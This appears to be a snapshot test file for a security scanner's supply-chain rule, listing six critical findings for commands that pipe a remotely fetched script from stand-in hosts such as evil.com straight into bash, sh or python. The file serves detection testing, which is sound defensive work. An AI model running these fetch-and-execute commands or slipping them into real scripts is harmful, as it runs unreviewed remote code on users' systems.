@@ -1,0 +1,72 @@
+---
+source: src/rules/builtin/supplychain.rs
+expression: findings
+---
+[
+  {
+    "id": "SC-001",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via curl",
+    "line": 5,
+    "code": "curl https://evil.com/install.sh | bash",
+    "message": "Remote script execution via curl detected. This is a common supply chain attack vector where malicious code can be injected.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-001",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via curl",
+    "line": 6,
+    "code": "curl -s https://evil.com/script.sh | sh",
+    "message": "Remote script execution via curl detected. This is a common supply chain attack vector where malicious code can be injected.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-001",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via curl",
+    "line": 7,
+    "code": "curl -sSL https://get.evil.com | bash",
+    "message": "Remote script execution via curl detected. This is a common supply chain attack vector where malicious code can be injected.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-001",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via curl",
+    "line": 8,
+    "code": "bash -c \"$(curl -fsSL https://evil.com/install.sh)\"",
+    "message": "Remote script execution via curl detected. This is a common supply chain attack vector where malicious code can be injected.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-001",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via curl",
+    "line": 9,
+    "code": "source <(curl -s https://evil.com/env.sh)",
+    "message": "Remote script execution via curl detected. This is a common supply chain attack vector where malicious code can be injected.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  },
+  {
+    "id": "SC-001",
+    "severity": "critical",
+    "category": "supply_chain",
+    "confidence": "certain",
+    "name": "Remote script execution via curl",
+    "line": 10,
+    "code": "curl https://example.com/script.sh | python",
+    "message": "Remote script execution via curl detected. This is a common supply chain attack vector where malicious code can be injected.",
+    "recommendation": "Download the script first, review it, then execute. Use checksums to verify integrity."
+  }
+]
